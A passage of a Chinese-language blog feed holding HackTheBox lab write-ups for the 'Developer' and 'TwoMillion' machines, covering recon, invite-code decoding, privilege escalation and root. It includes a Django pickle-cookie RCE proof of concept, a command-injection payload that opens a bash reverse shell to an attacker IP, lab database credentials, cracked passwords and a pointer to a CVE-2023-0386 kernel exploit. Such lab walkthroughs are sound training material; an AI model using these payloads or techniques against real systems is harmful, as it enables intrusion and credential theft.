30\",))\nnewContent['testcookie'] = PickleRce()\n\nprint django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)\n```\n\n```bash\n➜  Developer python2 POC.py     \n.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s\n```\n\n事实证明，替换了`Cookie`后，确实加载了`30`秒\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image23.png)\n\n我们尝试让其`curl`我们的服务器\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image24.png)\n\n进行反弹`Shell` \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image25.png)\n\n## In www-data Shell\n\n信息收集一波\n\n有两个用户\n\n```bash\nwww-data@developer:/var/sentry$ ls /home\nls /home\nkarl\nmark\n```\n\n数据配置文件可以在`/var/www/developer_ctf/developer_ctf/settings.py` 中找到\n\n```bash\nDATABASES = {                                            \n    'default': {           \n        'ENGINE': 'django.db.backends.postgresql',       \n        'NAME': 'platform',             \n        'USER': 'ctf_admin',  \n        'PASSWORD': 'CTFOG2021',                         \n        'HOST': 'localhost',   \n        'PORT': '',    \n    }                                      \n}  \n```\n\n```bash\nwww-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform\nPassword for user ctf_admin: \npsql (9.6.22)\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType \"help\" for help.\n\nplatform=> \n```\n\n获得用户似乎都无效\n\n```bash\n id |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          \n----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------\n  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00\n  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00\n  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00\n  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00\n  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00\n  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs$t9DwUfhd6jv8yiD7uih4HMgsKjrUg/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00\n 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl$a4bFd9XH8FUfnZl+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00\n  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00\n```\n\n然后在`/etc/sentry/sentry.conf.py` 又能找到一个数据库凭据\n\n```bash\n    'default': {\n        'ENGINE': 'sentry.db.postgres',\n        'NAME': 'sentry',                           \n        'USER': 'sentry',\n        'PASSWORD': 'SentryPassword2021',\n        'HOST': 'localhost',\n        'PORT': '',\n    }     \n}\n```\n\n这次能获得三个用户，并且`karl`是有家目录的\n\n```bash\nsentry=#   \nselect id,username,password from auth_user;\n id |      username       |                                   password                                    \n----+---------------------+-------------------------------------------------------------------------------\n  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=\n  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY$8aNutC5bwrU65AtpuvspwEicUw2+63EQ61zjTyzVViE=\n  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=\n(3 rows)\n```\n\n尝试破解密码\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image26.png)\n\n得到密码：`insaneclownposse`\n\n成功进入`Karl`用户`Shell`中，读取`user.txt`\n\n```bash\nkarl@developer:~$ cat user.txt\n77cc1a399155edc9a66dae47df32a834\n```\n\n## In Karl Shell - To Root\n\n`sudo`权限\n\n```bash\nkarl@developer:~$ sudo -l\n[sudo] password for karl: \nMatching Defaults entries for karl on developer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser karl may run the following commands on developer:\n    (ALL : ALL) /root/.auth/authenticator\n```\n\n拉出来`IDA` ，`rust` 逆向`+1`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image27.png)\n\n`main`中还有个`authentication::main` \n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  isize v4; // rdx\n  core::ops::function::_Fn<()> v5; // rdi\n  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF\n\n  v4 = argc;\n  v7 = authentication::main::h453271f02403abaf;\n  v5.vtable = (usize (*)[3])&anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;\n  v5.pointer = (u8 *)&v7;\n  return std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);\n}\n```\n\n进入到`authentication::main` ，前边两个`print`是打印前两条信息\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image28.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image29.png)\n\n再下面就是加密的函数\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image30.png)\n\n`args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &v36, 16LL, &v37, 16LL);`\n\n告诉我们使用`AES-CTR`进行加密，并且传入了从内存地址冲传入的两个常量`v36`和`v37` ，很有可能是`key`和`VI`\n\n我们从`v36` 和 `v37`中将值复制出来\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image31.png)\n\n还因为是小端显示的问题，我们还要对其转换一下\n\n```bash\nD5F5F4BE3DD4209E6191795C3432E8A3\n6A812006DC5598A79A95D2D9E3591F76\n//\nA3E832345C7991619E20D43DBEF4F5D5\n761F59E3D9D2959AA79855DC0620816A\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image32.png)\n\n我们将加密和解密函数准备好\n\n再到下边（代码喂给`AI`），首先会判断明文长度是否等于`32`\n\n```bash\nif ( size[1] == 32\n    && (ptr == (u8 *)v5\n     || _mm_movemask_epi8(\n          _mm_and_si128(\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + 1), _mm_loadu_si128(v5 + 1)),\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )\n  {\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image33.png)\n\n`ptr` (我们的解密结果) 的地址被加载到了 `RAX` 寄存器。`v5` (程序内置的目标明文) 的地址被加载到了 `R15` 寄存器。\n\n通过调试确认一下\n\n```bash\npwndbg> b main\npwndbg> r\npwndbg> b *0x55555555b9b9\nBreakpoint 2 at 0x55555555b9b9\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek's super secure login portal!\nEnter your password to access the super user:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //因为期待解密后明文长度是32因此输入32个A\npwndbg> hexdump $rax 32 //获取RAX的值\n+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  │./...D..│\\..k.i.\"│\n+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  │i....,..│...K.WnD│\n```\n\n```bash\n➜  Developer awk '{for(i=3;i<=18;i++) printf $i}' rax\ned2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    \n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image34.png)\n\n解密成功，那么`R15`的值应该就是我们需要的\n\n```bash\npwndbg> hexdump $r15 32\n+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 fc 5c 20 23  │..%..j..│x..X.\\.#│\n+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  │l.......│...:.'.,│\n```\n\n```bash\n➜  Developer awk '{for(i=3;i<=18;i++) printf $i}' r15\nfe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   \n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image35.png)\n\n得到重点`RustForSecurity@Developer@2021:)`\n\n我们到`karl`的`shell`中运行程序，会让我们输入我们的公钥\n\n```bash\nkarl@developer:~$ sudo /root/.auth/authenticator \n[sudo] password for karl: \nWelcome to TheCyberGeek's super secure login portal!\nEnter your password to access the super user: \nRustForSecurity@Developer@2021:)\nYou have successfully authenticated\nEnter your SSH public key in now:\nssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali\nYou may now authenticate as root!\n```\n\n然后通过我们的私钥就可以登录到`root`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image36.png)\n\n读取 `root.txt`\n\n```bash\nroot@developer:~# cat root.txt \n720b2e4080688fxxxxx\n```\n\n## 总结\n\n很多的知识盲区，或者说是我没耐心，很多地方都要看一下WP才能知道如何走下去\n\n总的来说难度个人而言 `8/10` ，泪",
            "url": "https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer",
            "title": "HackTheBox - Machine - Developer",
            "summary": "Machine Developer https://app.hackthebox.com/machines/Developer | Linux | Hard Recon 访问 HTTP 可以创建账户，注册一个用户 sunset ，创建完毕后会直接进入后台 里面会有一些CTF题？让你做？ CTF PE...",
            "date_modified": "2025-06-22T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Linux",
                "CTF",
                "Rrverse",
                "Rust",
                "Django",
                "Tabanbbing",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion",
            "content_html": "\n# Machine - TwoMillion\n\n> https://app.hackthebox.com/machines/TwoMillion | `Linux` | `Eas`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image.png)\n\n## Recon\n\n```bash\n➜  TwoMillion nmap -sT -min-rate 5000 10.10.11.221  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:22 CST\nNmap scan report for 10.10.11.221\nHost is up (0.072s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.94 seconds\n```\n\n```bash\n➜  TwoMillion nmap -sT -A -p 22,80 10.10.11.221   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:23 CST\nNmap scan report for 10.10.11.221\nHost is up (0.085s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx\n|_http-title: Did not follow redirect to http://2million.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   117.43 ms 10.10.16.1\n2   71.72 ms  10.10.11.221\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.44 seconds\n➜  TwoMillion ls                                  \n```\n\n访问 `HTTP` 服务，采集指纹，是介绍 `HackTheBox` 网站\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image1.png)\n\n有一个登录页\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image2.png)\n\n注册需要拿到邀请码\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image3.png)\n\n通过目录扫描能扫描到另外一个注册页面，依旧是需要`Invite Code`\n\n```bash\n➜  TwoMillion dirsearch -u http://2million.htb -e txt,zip -x 403,404,503 \n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 9979\n\nOutput File: /root/Desktop/HackTheBox/TwoMillion/reports/http_2million.htb/_25-06-20_20-53-44.txt\n\nTarget: http://2million.htb/\n\n[20:53:44] Starting: \n[20:53:53] 200 -    2KB - /404\n[20:54:04] 401 -    0B  - /api\n[20:54:04] 401 -    0B  - /api/v1\n[20:54:05] 301 -  162B  - /assets  ->  http://2million.htb/assets/\n[20:54:12] 301 -  162B  - /css  ->  http://2million.htb/css/\n[20:54:18] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/\n[20:54:20] 302 -    0B  - /home  ->  /\n[20:54:21] 301 -  162B  - /images  ->  http://2million.htb/images/\n[20:54:23] 301 -  162B  - /js  ->  http://2million.htb/js/\n[20:54:25] 200 -    4KB - /login\n[20:54:26] 302 -    0B  - /logout  ->  /\n[20:54:38] 200 -    4KB - /register\n[20:54:52] 301 -  162B  - /views  ->  http://2million.htb/views/\n\nTask Completed\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image4.png)\n\n## GetInviteCode\n\n我们仔细观察`invite`页面，会加载一个JS文件`inviteapi.min.js` ，是一个`Packer`一种`JavaScript`代码混淆器\n\n```bash\neval(\n  (function (p, a, c, k, e, d) {\n    e = function (c) {\n      return c.toString(36);\n    };\n    if (!''.replace(/^/, String)) {\n      while (c--) {\n        d[c.toString(a)] = k[c] || c.toString(a);\n      }\n      k = [\n        function (e) {\n          return d[e];\n        },\n      ];\n      e = function () {\n        return '\\\\w+';\n      };\n      c = 1;\n    }\n    while (c--) {\n      if (k[c]) {\n        p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]);\n      }\n    }\n    return p;\n  })(\n    '1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split(\n      '|',\n    ),\n    0,\n    {},\n  ),\n);\n\n```\n\n我们使用`AI`将其还原得到\n\n```bash\nfunction verifyInviteCode(code) {\n  var formData = { \"code\": code };\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    data: formData,\n    url: '/api/v1/invite/verify',\n    success: function(response) {\n      console.log(response);\n    },\n    error: function(response) {\n      console.log(response);\n    }\n  });\n}\n\nfunction makeInviteCode() {\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    url: '/api/v1/invite/how/to/generate',\n    success: function(response) {\n      console.log(response);\n    },\n    error: function(response) {\n      console.log(response);\n    }\n  });\n}\n```\n\n其中的`/api/v1/invite/how/to/generate`很令人感兴趣\n\n```bash\n➜  TwoMillion curl http://2million.htb/api/v1/invite/how/to/generate -X POST\n{\"0\":200,\"success\":1,\"data\":{\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\"enctype\":\"ROT13\"},\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"}#\n```\n\n> Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\n> \n\n从`dada`能看到，加密类型是`ROT13`\n\n```bash\n\"data\":{\n\t\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\n\t\"enctype\":\"ROT13\"\n}\n```\n\n通过`CyberChef`即可解密\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image5.png)\n\n```bash\nIn order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate\n```\n\n让我们向`/api/v1/invite/generate` 发起`POST`请求\n\n```bash\n➜  TwoMillion curl http://2million.htb/api/v1/invite/generate  -X POST     \n{\"0\":200,\"success\":1,\"data\":{\"code\":\"NjlKS04tMkVHSTQtM1NIN0YtUjNLRFk=\",\"format\":\"encoded\"}}#  \n```\n\n可以看到还是加密的，但是这次的加密就是简单的`base64`编码\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image6.png)\n\n得到邀请码 `69JKN-2EGI4-3SH7F-R3KDY`\n\n我们通过邀请码注册用户 `sunset`\n\n## 后台利用\n\n我们从`Rules`中能知道是可以攻击其他成员的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image7.png)\n\n并且在 `http://2million.htb/home/access#` 中能生成`opvn`文件（经过实验是无法进行连接的），端点是**`/**api/v1/user/vpn/generate`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image8.png)\n\n我们可以注意到端点是**`/**api/v1/user` 那么可能会有**`/**api/v1/admin`\n\n这里我使用`feroxbuster` 测试了很久，但是还是没有`fuzz`出来\n\n但是这里其实只需要访问 `/api/v1`就可以得到接口路径信息…\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image9.png)\n\n```bash\n{\n  \"v1\": {\n    \"user\": {\n      \"GET\": {\n        \"/api/v1\": \"Route List\",\n        \"/api/v1/invite/how/to/generate\": \"Instructions on invite code generation\",\n        \"/api/v1/invite/generate\": \"Generate invite code\",\n        \"/api/v1/invite/verify\": \"Verify invite code\",\n        \"/api/v1/user/auth\": \"Check if user is authenticated\",\n        \"/api/v1/user/vpn/generate\": \"Generate a new VPN configuration\",\n        \"/api/v1/user/vpn/regenerate\": \"Regenerate VPN configuration\",\n        \"/api/v1/user/vpn/download\": \"Download OVPN file\"\n      },\n      \"POST\": {\n        \"/api/v1/user/register\": \"Register a new user\",\n        \"/api/v1/user/login\": \"Login with existing user\"\n      }\n    },\n    \"admin\": {\n      \"GET\": {\n        \"/api/v1/admin/auth\": \"Check if user is admin\"\n      },\n      \"POST\": {\n        \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\"\n      },\n      \"PUT\": {\n        \"/api/v1/admin/settings/update\": \"Update user settings\"\n      }\n    }\n  }\n}\n```\n\n### 接口测试\n\n三个管理员接口中，我们对`/api/v1/admin/settings/update` 最感兴趣\n\n```bash\n\"admin\": {\n      \"GET\": {\n        \"/api/v1/admin/auth\": \"Check if user is admin\"\n      },\n      \"POST\": {\n        \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\"\n      },\n      \"PUT\": {\n        \"/api/v1/admin/settings/update\": \"Update user settings\"\n      }\n    }\n```\n\n因为它可能可以将普通用户更改为高权限用户\n\n调试接口，我们修改 `Content-Type: application/json` 时提示缺少参数 `email`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image10.png)\n\n添加 `email` 后缺少 `is_admin` ，继续跟着补全参数\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image11.png)\n\n设置 `is_admin` 为 `1`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image12.png)\n\n测试是否修改成功，我们回到管理员接口中的`/api/v1/admin/auth` ，回显`True`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image13.png)\n\n再获取管理员账户的`VPN`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image14.png)\n\n通过命令也可以拿到\n\n```bash\n➜  TwoMillion curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H 'Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4' -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}' -o admin.opvn\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 10844    0 10824  100    20  19492     36 --:--:-- --:--:-- --:--:-- 19538\n```\n\n但是经过测试，管理员的`opvn`文件也是无法使用的\n\n测试后发现存在命令注入漏洞\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image15.png)\n\n我们通过来反弹`shell`\n\n```bash\nPOST /api/v1/admin/vpn/generate HTTP/1.1\nHost: 2million.htb\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nCookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4\nUpgrade-Insecure-Requests: 1\nSec-GPC: 1\nPriority: u=0, i\nDNT: 1\nReferer: http://2million.htb/home/access\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\n\n{\n    \"username\":\"$(whoami;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.58/1234 0>&1')\"\n}\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image16.png)\n\n## 权限提升\n\n### Recon In www-data\n\n插件监听端口，在内网中发布了`mysql`和`Memcached`\n\n```bash\nwww-data@2million:~/html$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process\nudp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*\nudp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*\ntcp     LISTEN   0        80             127.0.0.1:3306           0.0.0.0:*\ntcp     LISTEN   0        1024           127.0.0.1:11211          0.0.0.0:*\ntcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:((\"nginx\",pid=1198,fd=6))\ntcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*\ntcp     LISTEN   0        511                 [::]:80                [::]:*      users:((\"nginx\",pid=1198,fd=7))\ntcp     LISTEN   0        128                 [::]:22                [::]:*\n```\n\n获取 `Memcached` 中的数据，命令网上查即可\n\n```bash\nstats items               \nSTAT items:1:number 1   \nSTAT items:1:number_hot 0       \n....\nSTAT items:4:evicted_unfetched 0\nSTAT items:4:evicted_active 0\n```\n\n```bash\nstats cachedump 1 100\nITEM foo [3 b; 0 s]\nEND\nstats cachedump 4 100\nITEM memc.sess.key.ldkjilnio1ali642q30g4cs1p4 [56 b; 1750433152 s]\nEND\n```\n\n```bash\nget foo\nVALUE foo 0 3\nbar\nEND\n\nget memc.sess.key.ldkjilnio1ali642q30g4cs1p4\nVALUE memc.sess.key.ldkjilnio1ali642q30g4cs1p4 0 56\nloggedin|b:1;id|i:13;username|s:6:\"sunset\";is_admin|i:1;\nEND\n```\n\n但是得到信息貌似并没有什么用\n\n在当前目录下的`.env` 中能找到 `admin` 用户的凭据\n\n```bash\nwww-data@2million:~/html$ cat .env \nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n```\n\n成功登录进去\n\n```bash\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nYou have mail.\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@2million:~$ \n```\n\n读取 `user.txt`\n\n```bash\nadmin@2million:~$ cat user.txt \ne3c66af3c3a55bxxxxxxx\n```\n\n### Recon In admin\n\n我们从`banner`信息中能看到`admin`用户有一封邮件\n\n```bash\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n***You have mail.***\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@2million:~$ \n```\n\n```bash\nadmin@2million:/var/mail$ cat admin \nFrom: ch4p <ch4p@2million.htb>\nTo: admin <admin@2million.htb>\nCc: g0blin <g0blin@2million.htb>\nSubject: Urgent: Patch System OS\nDate: Tue, 1 June 2023 10:45:22 -0700\nMessage-ID: <9876543210@2million.htb>\nX-Mailer: ThunderMail Pro 5.2\n\nHey admin,\n\nI'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.\n\nHTB Godfather\n```\n\n> 嗨，管理员，\n我知道你正在尽快完成数据库迁移。趁着我们部分服务器宕机，能不能也升级一下我们虚拟主机的操作系统？今年已经出现了几个严重的 Linux 内核 CVE 漏洞。OverlayFS/FUSE 的那个漏洞看起来很糟糕。我们不能被它给坑了。\n> \n\n### **CVE-2023-0386**\n\n直接明牌了\n\n利用链接：https://github.com/xkaneiki/CVE-2023-0386\n\n跟着`Readme`敲就行\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image17.png)\n\n读取 `root.txt`\n\n```bash\nroot@2million:/root# cat root.txt \nc7bea054524b8584598731e5cb0441bb\n```\n\n## 总结 & 小彩蛋\n\n不难，但是步骤多，在前期需要进行很多枚举\n\n`root`目录下`thank_you.json` 是一串加密后的数据\n\n```bash\nroot@2million:/root# cat thank_you.json \n{\"encoding\": \"url\", \"data\": \"%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f785152